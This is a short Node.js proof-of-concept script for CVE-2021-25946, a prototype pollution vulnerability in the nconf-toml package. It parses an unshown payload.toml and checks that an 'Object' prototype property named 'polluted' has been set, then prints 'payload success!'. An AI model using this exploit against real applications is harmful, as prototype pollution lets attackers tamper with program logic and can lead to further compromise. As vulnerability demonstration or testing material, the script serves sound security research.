//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25946

var nt = require("nconf-toml")
var fs = require('fs');
const { assert } = require("@firebase/util");
var obj = {};
console.log("Before : " + {}.polluted);
var parsed = nt.parse(fs.readFileSync('./payload.toml', 'utf-8'));

console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!")